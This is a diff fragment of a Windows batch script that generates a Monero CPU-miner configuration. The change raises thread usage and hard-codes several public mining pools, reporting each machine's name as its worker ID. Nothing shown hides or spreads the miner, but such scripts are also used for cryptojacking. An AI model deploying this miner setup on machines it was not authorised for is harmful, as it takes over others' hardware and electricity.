@@ -151,14 +151,35 @@ echo [*] Generating config file... >> "%temp%\miner_debug.log"
   echo     "priority": 3,
   echo     "memory-pool": true,
   echo     "asm": true,
-  echo     "max-threads-hint": 75,
+  echo     "max-threads-hint": 85,
   echo     "affinity": !AFFINITY_MASK!
   echo   },
   echo   "opencl": false,
   echo   "cuda": false,
   echo   "pools": [
   echo     {
-  echo       "url": "%POOL%",
+  echo       "url": "gulf.moneroocean.stream:10128",
+  echo       "user": "%WALLET%",
+  echo       "pass": "%COMPUTERNAME%",
+  echo       "keepalive": true,
+  echo       "tls": false
+  echo     },
+  echo     {
+  echo       "url": "pool.supportxmr.com:5555",
+  echo       "user": "%WALLET%",
+  echo       "pass": "%COMPUTERNAME%",
+  echo       "keepalive": true,
+  echo       "tls": false
+  echo     },
+  echo     {
+  echo       "url": "mine.moneroocean.stream:10032",
+  echo       "user": "%WALLET%",
+  echo       "pass": "%COMPUTERNAME%",
+  echo       "keepalive": true,
+  echo       "tls": false
+  echo     },
+  echo     {
+  echo       "url": "pool.hashvault.pro:5555",
   echo       "user": "%WALLET%",
   echo       "pass": "%COMPUTERNAME%",
   echo       "keepalive": true,
